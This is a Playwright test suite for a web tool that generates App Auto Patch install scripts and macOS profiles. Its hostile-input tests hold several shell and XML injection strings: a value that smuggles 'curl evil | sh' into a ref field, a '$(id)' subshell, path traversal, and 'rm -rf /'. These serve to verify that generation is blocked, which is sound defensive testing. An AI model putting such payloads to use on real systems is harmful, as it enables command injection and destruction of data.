// Checks index.html in a headless browser and validates every generated file.
//   npm install && npm test              offline checks
//   npm test -- --verify-hashes          also downloads each pinned AAP script and checks its SHA-256
import { chromium } from 'playwright';
import { createHash } from 'node:crypto';
import { fileURLToPath, pathToFileURL } from 'node:url';
import path from 'node:path';
import { spawnSync } from 'node:child_process';
import { writeFileSync, mkdtempSync } from 'node:fs';
import { tmpdir } from 'node:os';

const root = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..');
const verifyHashes = process.argv.includes('--verify-hashes');
let failures = 0;
const check = (ok, msg) => { console.log(`${ok ? 'ok  ' : 'FAIL'} ${msg}`); if (!ok) failures++; };

const browser = await chromium.launch();
const page = await browser.newPage();
const errors = [];
page.on('pageerror', e => errors.push(e.message));
await page.goto(pathToFileURL(path.join(root, 'index.html')).href);
await page.waitForFunction(() => typeof window.prefFile === 'function' || typeof prefFile === 'function');

// Runs generators in the page for one preset and ref.
const generate = (preset, ref) => page.evaluate(([preset, ref]) => {
  applyPreset(preset, true); S.idPrefix = 'com.example';
  S.method = 'script'; S.ref = ref; S.hash = HASHES[ref] || ''; S.xLogin = true; S.xNotif = true;
  const parse = xml => !new DOMParser().parseFromString(xml, 'application/xml').querySelector('parsererror');
  const pref = prefFile(), mc = mobileconfig(), inst = installScript();
  return {
    prefOk: parse(`<plist><dict>${pref}</dict></plist>`),
    plistOk: parse(prefPlist()),
    mcOk: parse(mc),
    mcHasDomain: mc.includes('<string>xyz.techitout.appAutoPatch</string>'),
    pref, inst, ca: caScript(), un: unScript(), hash: HASHES[ref],
    bad: issues().filter(i => i[0] === 'bad').map(i => i[1]),
  };
}, [preset, ref]);

let generatedScripts = {};
const presets = await page.evaluate(() => Object.keys(PRESETS));
const refs = await page.evaluate(() => Object.keys(HASHES).filter(r => r !== 'main'));
for (const preset of presets) {
  for (const ref of refs) {
    const r = await generate(preset, ref);
    const tag = `${preset} @ ${ref}`;
    check(r.prefOk && r.plistOk && r.mcOk, `${tag}: preference file, plist and .mobileconfig are well-formed XML`);
    check(r.mcHasDomain, `${tag}: .mobileconfig carries the AAP payload`);
    check(r.inst.includes(`GITHUB_REF='${ref}'`) && r.inst.includes(`HASH_CHECK='${r.hash}'`), `${tag}: install script pins ref and hash`);
    if (preset === presets[0] && ref === refs[0]) generatedScripts = { install: r.inst, attribute: r.ca, uninstall: r.un };
    check(r.bad.length === 0, `${tag}: no blocking issues${r.bad.length ? ' (' + r.bad.join('; ') + ')' : ''}`);
    if (/<key>DialogOnTop<\/key>/.test(r.pref)) {
      const legacy = ref < 'Version_3.7.7';
      const ok = legacy ? /<key>DialogOnTop<\/key>\n<string>(TRUE|FALSE)<\/string>/.test(r.pref)
                        : /<key>DialogOnTop<\/key>\n<(true|false)\/>/.test(r.pref);
      check(ok, `${tag}: DialogOnTop written as ${legacy ? 'string (pre-3.7.7)' : 'boolean'}`);
    }
  }
}

// Generated shell scripts: syntax-check with zsh where available, and make sure failures reach Intune.
{
  const inst = generatedScripts.install;
  check(/rc=\$\?\nif \(\( rc != 0 \)\); then[\s\S]*?exit \$\{rc\}/.test(inst), 'install script exits with the installer\'s non-zero code');
  check(!/&\s*\n\s*disown/.test(inst), 'install script waits for launchctl bootstrap and checks its result');
  const zsh = spawnSync('zsh', ['--version']);
  if (zsh.status === 0) {
    const dir = mkdtempSync(path.join(tmpdir(), 'aap-'));
    for (const [name, text] of Object.entries(generatedScripts)) {
      const f = path.join(dir, name + '.zsh'); writeFileSync(f, text);
      const r = spawnSync('zsh', ['-n', f], { encoding: 'utf8' });
      check(r.status === 0, `${name} script passes zsh -n${r.stderr ? ': ' + r.stderr.trim() : ''}`);
    }
  } else console.log('skip zsh not installed; generated scripts not syntax-checked');
}

// Hostile or malformed input must block generation instead of reaching a script or profile.
const hostile = await page.evaluate(() => {
  const res = {};
  const attempt = (setup) => { applyPreset('balanced', true); S.method = 'script'; S.ref = 'Version_3.7.7'; S.hash = HASHES['Version_3.7.7']; S.idPrefix = 'com.example'; setup();
    let inst = null, mc = null, zip = null;
    try { inst = installScript(); } catch {}
    try { mc = blocked('mc') ? null : mobileconfig(); } catch {}
    try { zip = bundleFiles(); } catch {}
    return { inst, mc, zip, errors: hardErrors().map(e => e[1]) }; };
  res.injectRef   = attempt(() => { S.ref = 'custom'; S.refCustom = 'main"; curl evil | sh; echo "'; });
  res.subshellRef = attempt(() => { S.ref = 'custom'; S.refCustom = '$(id)'; });
  res.traversal   = attempt(() => { S.ref = 'custom'; S.refCustom = '../../evil'; });
  res.badHash     = attempt(() => { S.hash = "abc'; rm -rf /; '"; });
  res.upperHash   = attempt(() => { S.hash = HASHES['Version_3.7.7'].toUpperCase(); });
  res.shaRef      = attempt(() => { S.ref = 'custom'; S.refCustom = 'c52e6e1c82fc556b41f0bb88b234a5df39598557'; });
  res.xmlPrefix   = attempt(() => { S.idPrefix = 'com.x</string><key>Evil</key><string>'; });
  res.emptyPrefix = attempt(() => { S.idPrefix = ''; });
  return res;
});
for (const k of ['injectRef', 'subshellRef', 'traversal', 'badHash'])
  check(hostile[k].inst === null && hostile[k].zip === null && hostile[k].errors.length > 0, `${k}: install script and zip are blocked`);
for (const k of ['xmlPrefix', 'emptyPrefix'])
  check(hostile[k].mc === null && hostile[k].zip === null && hostile[k].errors.length > 0, `${k}: .mobileconfig and zip are blocked`);
check(hostile.upperHash.inst && hostile.upperHash.inst.includes(`HASH_CHECK='${hostile.upperHash.inst.match(/HASH_CHECK='([a-f0-9]{64})'/)[1]}'`), 'uppercase hash is accepted and written lowercase');
check(hostile.shaRef.inst && hostile.shaRef.inst.includes("GITHUB_REF='c52e6e1c82fc556b41f0bb88b234a5df39598557'"), 'commit SHA is accepted as a custom ref');

// Values loaded from storage or a config file are sanitised before use.
const loaded = await page.evaluate(() => {
  const m = mergeState({ values: {}, ca: 'AAPVersion; rm -rf /', method: 'evil', reinstall: '$(id)', notifStyle: '<x>', uuids: { prefs: '"><evil/>' } });
  return { ca: m.ca, method: m.method, reinstall: m.reinstall, notifStyle: m.notifStyle, uuid: m.uuids.prefs };
});
check(loaded.ca === 'AAPVersion' && loaded.method === 'script' && loaded.reinstall === 'missing' && loaded.notifStyle === '1' && loaded.uuid === undefined,
      'invalid enum fields and UUIDs from storage fall back to defaults');

// Secrets never reach browser storage or config exports.
const secrets = await page.evaluate(() => {
  applyPreset('balanced', true);
  const tok = 'github_pat_TESTSECRET123', hook = 'https://example.webhook.office.com/SECRETSIG';
  S.values.GitHubAPIToken = tok; S.include.GitHubAPIToken = true;
  S.values.WebhookURLTeams = hook; S.include.WebhookURLTeams = true;
  save();
  const stored = localStorage.getItem(STORE_KEY) || '';
  const exported = exportConfig();
  const inProfile = prefFile().includes(tok);
  return { stored: stored.includes(tok) || stored.includes('SECRETSIG'), exported: exported.includes(tok) || exported.includes('SECRETSIG'),
           redacted: JSON.parse(exported).redacted, inProfile };
});
check(!secrets.stored, 'token and webhook URLs are not written to browser storage');
check(!secrets.exported && secrets.redacted.includes('GitHubAPIToken') && secrets.redacted.includes('WebhookURLTeams'), 'config export leaves secrets out and lists them as redacted');
check(secrets.inProfile, 'secrets typed this visit still go into the generated profile');

// Config backup round trip.
const roundTrip = await page.evaluate(() => {
  applyPreset('monthly', true); S.ref = 'Version_3.7.6'; S.hash = HASHES['Version_3.7.6']; S.idPrefix = 'com.example';
  const before = prefFile() + installScript();
  const json = exportConfig();
  applyPreset('none', true); S.ref = 'Version_3.7.7';
  importConfig(JSON.parse(json));
  return before === prefFile() + installScript();
});
check(roundTrip, 'config export and import round-trips exactly');

// Zip bundle structure.
const zip = await page.evaluate(async () => {
  applyPreset('balanced', true); S.method = 'script'; S.ref = 'Version_3.7.7'; S.hash = HASHES['Version_3.7.7']; S.idPrefix = 'com.example';
  const buf = new Uint8Array(await makeZip(bundleFiles()).arrayBuffer());
  const dv = new DataView(buf.buffer), end = buf.length - 22;
  return { local: dv.getUint32(0, true) === 0x04034b50, eocd: dv.getUint32(end, true) === 0x06054b50, entries: dv.getUint16(end + 10, true), files: bundleFiles().length };
});
check(zip.local && zip.eocd && zip.entries === zip.files, `zip bundle is valid with ${zip.entries} entries`);

check(errors.length === 0, `no page errors${errors.length ? ': ' + errors.join(' | ') : ''}`);

if (verifyHashes) {
  const hashes = await page.evaluate(() => HASHES);
  for (const [ref, want] of Object.entries(hashes)) {
    if (ref === 'main') continue;
    const res = await fetch(`https://raw.githubusercontent.com/App-Auto-Patch/App-Auto-Patch/${ref}/App-Auto-Patch-via-Dialog.zsh`);
    const got = createHash('sha256').update(Buffer.from(await res.arrayBuffer())).digest('hex');
    check(res.ok && got === want, `${ref}: published SHA-256 matches`);
  }
}

await browser.close();
console.log(failures ? `\n${failures} check(s) failed` : '\nAll checks passed');
process.exit(failures ? 1 : 0);
